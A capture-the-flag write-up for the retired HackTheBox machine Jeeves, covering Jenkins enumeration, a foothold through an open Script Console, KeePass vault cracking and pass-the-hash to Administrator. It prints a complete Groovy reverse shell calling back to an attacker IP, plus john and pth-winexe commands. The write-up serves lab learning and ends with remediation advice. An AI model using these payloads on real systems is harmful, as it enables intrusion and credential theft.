HTB Jeeves: open Jenkins console, cracked KeePass, hash to admin

retired-machineeasy

Jeeves is a retired HackTheBox easy Windows machine themed around enterprise automation. Synopsis: an unauthenticated Jenkins script console for foothold, a KeePass vault cracked with john, and an NTLM hash walked to Administrator.

$ Enumeration — management consoles

# nmap: spot Jenkins plus friends
nmap -sC -sV -oN jeeves.nmap 10.10.10.63

IIS, SMB, and a Jenkins server with its Script Console reachable without login. CI consoles execute code by design — check unauthenticated access on every management UI early.

$ Foothold — Groovy console RCE

# jenkins console: Groovy reverse shell
String host="10.10.14.23";int port=4444;String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try{p.exitValue();break;}catch(Exception e){}}

Paste into Manage Jenkins → Script Console with a listener up: shell as the kohsuke service user. No CVE — intended functionality left facing the network.

$ Lateral data — KeePass vault

# bash: exfiltrate, crack, reuse hash
# on target: C:\Users\kohsuke\Documents\CEH.kdbx -> download it
keepass2john CEH.kdbx > keepass.hash
john --wordlist=/usr/share/wordlists/rockyou.txt keepass.hash
# vault opens -> Administrator NTLM hash
pth-winexe -U 'Administrator%<hash>' //10.10.10.63 cmd

The vault opens to an Administrator NTLM hash — pass-the-hash straight to local Administrator, and both flags fall. Vaults on-disk are only as safe as their master passwords. Flag values redacted per HTB rules; earn them in your own lab.

$ Dead ends

Attacking IIS and SMB first (the Jenkins console is the glowing door) and trying to crack the hash before opening the vault (order matters: vault first, then hash).

$ Remediation notes

Authenticate and network-restrict CI consoles, never store vaults on shared hosts with weak master passwords, and treat NTLM hash exposure as full compromise. Written by Lucky Thandel.
